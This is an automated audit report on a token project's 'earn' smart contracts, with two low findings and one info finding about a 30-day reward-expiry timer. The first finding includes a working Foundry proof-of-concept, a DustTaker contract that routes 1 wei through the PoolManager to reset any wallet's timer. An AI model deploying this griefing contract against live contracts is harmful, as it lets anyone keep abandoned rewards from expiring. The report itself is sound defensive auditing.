# Audit report

> Final check: Pepes Earn IMD. Repository https://github.com/0xtenang/PepesFamily, commit b686e0e2e0735d794da97378da595ea232b99773, scope contracts/src/earn/. Your re-check (https://explorer.imd.fun/jobs/f6d3cd0e-8371-417b-80d6-7b99fc9efa0c) at 7bb7a90 found 1 high, 2 low and 2 info. Changes since:
>
> Royalty conversion removed entirely. The ERC-2981 royalty is 1% to PepesEarnIMD.feeRecipient() (read live by the mirror). The hook holds and swaps nothing and has no receive(). This addresses the high, low 3 and info 4–5.
> Low 2: in _moved, the recipient's lastActive is only set for buys (from an excluded address), transfers it initiated (actor == to), or a first-time holder.
> Please confirm these are fixed and check for any new issues, especially in _moved (expiry correctness when an incoming transfer isn't recorded) and in buybackAndBurnPepes / maxBuyback. Tests: contracts/test/PepesEarn.t.sol, and the fork test FORK_RPC=https://robinhood.drpc.org forge test --mc PepesEarnForkTest.

| | |
|---|---|
| Repository | https://github.com/0xtenang/PepesFamily.git |
| Commit | `b686e0e2e0735d794da97378da595ea232b99773` |
| Job | `a58eb2c6-bfc3-441e-86d8-432c2ab15114` |
| Judged | 2026-10-04 16:30 UTC |
| Findings | 2 low · 1 info |

Four agents audited the code as it is at `b686e0e`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. Low: Re-check low 2 is only half closed: 1 wei of $EARN moved out of the PoolManager by anyone still resets any wallet's 30-day timer

`contracts/src/earn/PepesEarnToken.sol:217`

```
            if (fromExcluded || actor == to || lastActive[to] == 0) lastActive[to] = block.timestamp;
```

_moved treats every receipt whose sender is an excluded address as the recipient's own buy (`fromExcluded`), on the assumption that tokens leaving the pool were bought by the recipient. The PoolManager is excluded, and anyone can make it the sender to an arbitrary address: inside their own `poolManager.unlock` they call `poolManager.take(EARN, victim, 1)` and repay the pool with 1 wei of their own $EARN (`sync` / `transfer` / `settle`). No swap happens, so the hook charges no fee; the whole cost is 1 wei of $EARN plus gas. The token sees from = poolManager and msg.sender = poolManager, so `fromExcluded` is true and lastActive[victim] = block.timestamp although the victim did nothing. A dust swap through any third-party v4 router with the victim as recipient does the same (the 4% fee on dust rounds to 0). This is the same griefing as re-check low 2, routed through the pool instead of a plain transfer: repeated once per 30 days per wallet it keeps the rewards of lost or abandoned wallets out of the $Pepes buyback reserve indefinitely. Only the direct holder-to-holder gift is fixed, and test_expiry_dustGiftDoesNotResetTimer covers only that path. Nobody steals anything, so the severity stays low as in the re-check. The token cannot distinguish a router buy from an arbitrary `take`: both project routers deliver with `poolManager.take(token, user, out)`. Fix options that keep the design: (a) stop inferring activity from `fromExcluded`; let receipts reset the timer only for a first-time holder or when `actor == to`, so a buyer's timer restarts on its next claim or send (and document that); (b) have the project's routers report the buyer to the token through a function restricted to `router` / `ethRouter` (needs a router change, since the routers are reused unchanged); (c) require a receipt from an excluded address to be at least one whole token before it counts, so a reset costs the attacker a real $EARN gifted to the victim each 30 days; or (d) accept and document that anyone can keep any wallet's rewards from expiring. Reproduced with the attached test and again with a Forwarder helper in test/scratch (4 specialist reports of this issue merged here).

**Reproduction**

Unit setup of contracts/test/PepesEarn.t.sol (or the attached self-contained test). alice buys with 100 IMD, bob buys with 100 IMD (alice earns 5999999999999999999 wei IMD), warp 31 days: expiredRewardsOf(alice) = 5999999999999999999. bob sends 1 wei $EARN to a helper contract D; any account calls D.poke(alice), which runs pm.unlock and in unlockCallback: pm.take(Currency.wrap(earn), alice, 1); pm.sync(Currency.wrap(earn)); earn.transfer(address(pm), 1); pm.settle(). Expected (per the comment at lines 212-214 and re-check low 2): alice did not act, lastActive(alice) unchanged, expiredRewardsOf(alice) >= 5999999999999999998 and recycle(alice) moves it to the reserve. Actual on b686e0e: lastActive(alice) == block.timestamp, expiredRewardsOf(alice) == 0, recycle(alice) returns 0. The attached test fails with 'a third party's dust gift reset alice's 30-day timer: 0 < 5999999999999999998'.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {PepesEarnIMD} from "src/earn/PepesEarnIMD.sol";
import {PepesEarnToken} from "src/earn/PepesEarnToken.sol";
import {PepesEarnRenderer} from "src/earn/PepesEarnRenderer.sol";
import {PepesFamilyRouter} from "src/PepesFamilyRouter.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Anyone: moves 1 wei of $EARN out of the PoolManager to `victim` and repays the pool with 1 wei of its own.
contract DustTaker is IUnlockCallback {
    IPoolManager immutable pm;
    PepesEarnToken immutable t;
    address victim;

    constructor(IPoolManager pm_, PepesEarnToken t_) {
        pm = pm_;
        t = t_;
    }

    function poke(address v) external {
        victim = v;
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        pm.take(Currency.wrap(address(t)), victim, 1);
        pm.sync(Currency.wrap(address(t)));
        t.transfer(address(pm), 1);
        pm.settle();
        return "";
    }
}

contract DustTakeTest is Test {
    PoolManager pm;
    MockERC20 imd;
    PepesEarnIMD hook;
    PepesEarnToken earn;
    PepesFamilyRouter router;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address owner = makeAddr("owner");

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new MockERC20();
        bytes memory initCode = abi.encodePacked(
            type(PepesEarnIMD).creationCode,
            abi.encode(
                pm, address(imd), owner, owner, int24(0), PepesEarnIMD.ImdEthPool(10_000, 100, address(0)), address(0xBEEF), address(0xCAFE)
            )
        );
        // mine a CREATE2 salt so the hook address carries the hook flags in its low 14 bits
        bytes32 h = keccak256(initCode);
        uint256 salt;
        for (;; salt++) {
            address a = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), h)))));
            if (uint160(a) & 0x3FFF == 0x28CC) break;
        }
        address deployed;
        assembly {
            deployed := create2(0, add(initCode, 0x20), mload(initCode), salt)
        }
        hook = PepesEarnIMD(deployed);
        router = PepesFamilyRouter(hook.router());
        earn = new PepesEarnToken(address(hook), address(new PepesEarnRenderer()));
        vm.prank(owner);
        hook.openPool(address(earn));
        address[2] memory users = [alice, bob];
        for (uint256 i; i < 2; i++) {
            imd.mint(users[i], 1_000e18);
            vm.prank(users[i]);
            imd.approve(address(router), type(uint256).max);
        }
    }

    function test_dustTakenFromPoolManagerMustNotResetTimer() public {
        vm.prank(alice);
        router.buy(address(earn), 100e18, 0, block.timestamp);
        vm.prank(bob);
        router.buy(address(earn), 100e18, 0, block.timestamp); // alice earns
        vm.warp(vm.getBlockTimestamp() + 31 days);
        uint256 expired = earn.expiredRewardsOf(alice);
        assertGt(expired, 0, "alice's rewards have expired");

        // bob (any third party) gifts alice 1 wei, routed through the PoolManager instead of a plain transfer
        DustTaker d = new DustTaker(pm, earn);
        vm.prank(bob);
        earn.transfer(address(d), 1);
        d.poke(alice);

        assertGe(earn.expiredRewardsOf(alice), expired - 1, "a third party's dust gift reset alice's 30-day timer");
    }
}
```

### 2. Low: A marketplace NFT purchase (or any intermediary-delivered buy) no longer counts as the buyer's activity, so a buying wallet's older rewards can be recycled right after it buys

`contracts/src/earn/PepesEarnToken.sol:217`

```
            if (fromExcluded || actor == to || lastActive[to] == 0) lastActive[to] = block.timestamp;
```

After the low 2 change a receipt resets the recipient's timer only when the tokens come from an excluded address, when `actor == to`, or for a first-time holder. A marketplace sale satisfies none of these for an existing holder: the marketplace (the seller's approved operator or conduit) calls mirror.transferFrom(seller, buyer, id), so `actor` (the mirror's msgSender passed at line 194) is the marketplace, `from` is the seller (not excluded) and lastActive[buyer] is already set. The same holds for a pool buy through a third-party v4 router that takes to itself and forwards, an accepted offer, an escrow or a custodian withdrawal. The seller in the same sale is marked active by the operator's call, so the two sides of one trade are treated differently. Before this change the purchase reset the timer. The README (contracts table, 'no $EARN it bought or pulled itself') and the site ('doesn't claim or move any $EARN for 30 days', 'or move any $EARN') tell holders a purchase keeps their rewards, but a collector who keeps buying NFTs on a marketplace and never claims has everything earned more than 30 days ago recycled 30 days after its last pool trade, send or claim; the loss to the holder is permanent (the IMD goes to the buyback reserve), though nobody else can take it. Marketplace trading is an advertised path (ERC-2981 royalty), so this is a regular user flow. I checked the expiry arithmetic the brief asks about and it stays safe: an unrecorded inflow only raises balanceOf, so `recent` at line 287 is over-estimated, never under-estimated (scratch tests: a gift before the cutoff gives expired == A1 exactly; a gift after the cutoff gives expired 5143749999999962499 < A1 = 5999999999999999999). Only the activity timer is affected. The chain cannot tell a purchase from a gift, so this needs a scope decision rather than a one-line fix: either state in the README and on the site that only claims, sends, pulls the wallet makes itself and pool buys through the PepesFamily routers reset the timer (marketplace purchases and gifts do not), or count the receipt of at least one whole unit (an NFT) as activity, which makes a griefing gift cost a full $EARN rather than dust, or treat all receipts alike per option (a) of the previous finding and document that. Four specialist reports merged.

**Reproduction**

Unit setup of contracts/test/PepesEarn.t.sol at t0 = 1800000000: alice buys with 100 IMD, bob buys with 100 IMD (withdrawableDividendOf(alice) = 5999999999999999999). Warp to t0+20 days. bob calls mirror.setApprovalForAll(market, true); market calls mirror.transferFrom(bob, alice, id) for one of bob's ids with alice as tx.origin (vm.prank(market, alice)): alice's $EARN balance rises by 1e18. Expected per README/site: alice's timer restarts at t0+20d, so at t0+31d expiredRewardsOf(alice) == 0 (control: _buy(alice, 1e18) at t0+20d gives lastActive(alice) == t0+20d and expiredRewardsOf(alice) == 0 at t0+31d). Actual on b686e0e: lastActive(bob) == 1801728000 (t0+20d) but lastActive(alice) == 1800000000 (t0); at t0+31d expiredRewardsOf(alice) == 5999999999999999999 and recycle(alice), callable by anyone, moves that IMD into buybackReserve. Scratch test test_judge_marketplacePurchaseIsNotActivity in test/scratch/EarnJudge.t.sol.

### 3. Info: Comments and NatSpec still describe lastActive as updated on every balance change, which the low 2 fix made false

`contracts/src/earn/PepesEarnToken.sol:284`

```
        // The balance cannot have changed since `last` (any change marks the holder active), so what it earned
```

Since the low 2 change an incoming transfer from a non-excluded address that the recipient did not initiate no longer touches lastActive, so three places now misdescribe the code: line 107 ('Last claim or $EARN balance change of each holder'), lines 284-285 ('The balance cannot have changed since `last` (any change marks the holder active)') and the contract notice at lines 52-53 ('neither claimed nor moved any $EARN'). The expiredRewardsOf maths does not rely on the line 284 claim (an unrecorded inflow only over-estimates `recent`, see the previous finding), so this is documentation only, but a future reader of line 284 would conclude the balance is constant since `last` and could build on that. Fix: reword line 107 to 'last claim, send, own pull or pool buy', and line 284 to say the balance can only have grown since `last` (sends always record activity), which is why using the current balance over-estimates recent rewards in the holder's favour; align the notice at lines 52-53 and the README/site wording with whichever rule the previous finding settles on.

**Reproduction**

State: alice buys at t0 and bob buys (alice earns). At t0+20d bob transfers 50e18 $EARN to alice (bob initiates). Read earn.lastActive(alice): comment at line 107 says it is the time of her last balance change (t0+20d); actual value is t0. Scratch test test_judge_expiryAmountWithUnrecordedInflow_afterCutoff shows the balance did change since `last` while expiredRewardsOf still returned a value below the true expired amount (5143749999999962499 vs 5999999999999999999), i.e. the line 284 premise is false but the result is safe.

---

Judge's submission `e42474cbcb5c03e482f211ff3c8766af2586ea2047053abef5b6a8571f36ab49`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
